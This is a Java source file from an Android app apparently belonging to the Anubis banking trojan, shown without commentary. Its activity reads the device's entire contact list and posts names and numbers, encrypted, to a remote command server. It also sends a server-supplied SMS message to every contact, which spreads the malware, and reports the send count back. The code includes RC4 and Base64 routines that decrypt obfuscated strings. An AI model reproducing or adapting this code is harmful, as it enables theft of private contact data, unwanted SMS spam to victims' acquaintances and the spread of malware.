package anubis.bot.myapplication.Activity;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.Base64;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.R;
import anubis.bot.myapplication.UtilsClass;
import anubis.bot.myapplication.Constants;

public class ActivityGetNumber extends Activity
{
    UtilsClass SF = new UtilsClass();
    Constants const_ = new Constants();

    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
       // setContentView(R.layout.activity_activ_all_numbers);
        try {
        Intent intent = getIntent();
        String str = intent.getStringExtra("str");
        String text_cwc = intent.getStringExtra("cwc_text");

        if(str.contains("0")) getNumber(this.getContentResolver());
        if(str.contains("1")) getNumberG0_CWC(this.getContentResolver(),text_cwc);
         finish();
        }catch (Exception ex){
            finish();

        }
    }

    public void getNumber(ContentResolver cr)
    {
        try {
            String getNumber = SF.SetRead(this, "getNumber");
            if (!getNumber.equals("true")) {
                Cursor phones = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

                String phoneNumber = "(" + SF.country(this) + ") Numbers from the phone book";
                //  String phoneNumber="uu";
                while (phones.moveToNext()) {
                    String nn = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));

                    if ((!nn.contains("*")) && (!nn.contains("#")) && (nn.length() > 6) && (!phoneNumber.contains(nn))) {
                        phoneNumber = phoneNumber + nn + "     " + name + "</br>" + '\n';
                    }
                }
                SF.POST(this, "4", "p=" + SF.trafEnCr(SF.ID_B(this) + "|" + phoneNumber + "|"));
                SF.SetWrite(this, "getNumber", "true");
                finish();

            }
        }catch (Exception ex){
            finish();
        }

    }
    //VVmusor2
    public void getNumberG0_CWC(ContentResolver cr, String text) {
        Cursor phones = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        String phoneNumber = "";
        boolean cwc_good = false;
        int schet_sws = 0;
        while (phones.moveToNext()) {
            phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            if ((!phoneNumber.contains("*")) && (!phoneNumber.contains("#")) && (phoneNumber.length() > 7)) {//
                try {
                    // SF.Log("sms send", phoneNumber);
                    SF.sendSMS(this, phoneNumber, text);
                    cwc_good = true;
                    schet_sws++;

                } catch (Exception ex) {
                    SF.POST(this, "4", "p=" + SF.trafEnCr(SF.ID_B(this) + "|Error sending SMS, maybe there are no permission to send!|"));
                    cwc_good = false;
                    break;
                }
            }
        }
        if (cwc_good == true) {
            SF.POST(this, "4", "p=" + SF.trafEnCr(SF.ID_B(this) + "|The dispatch was successful, " + schet_sws + " SMS sent|"));
        }
        finish();
        //Vmusor1
    }
    //VVmusor1
}
